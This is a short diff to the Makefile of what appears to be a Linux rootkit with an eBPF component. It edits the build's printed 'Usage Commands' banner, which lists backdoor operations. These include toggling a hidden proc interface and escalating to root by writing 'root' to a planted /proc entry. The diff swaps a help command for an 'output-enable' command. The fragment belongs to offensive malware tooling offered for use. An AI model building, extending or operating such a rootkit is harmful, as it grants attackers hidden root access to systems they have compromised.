@@ -114,7 +114,7 @@ endif
 	@echo "Usage Commands:"
 	@echo "  Toggle proc UI:    rm -f $(subst 0x,,$(PRCKEY))"
 	@echo "  Escalate to root:  echo root > /proc/$(PROCNAME)"
-	@echo "  View help:         echo help > /proc/$(PROCNAME) && cat /proc/$(PROCNAME)"
+	@echo "  Enable output:     echo output-enable > /proc/$(PROCNAME) && cat /proc/$(PROCNAME)"
 	@echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
 $(EBPF_BPF_OBJ): $(EBPF_C_SRC)
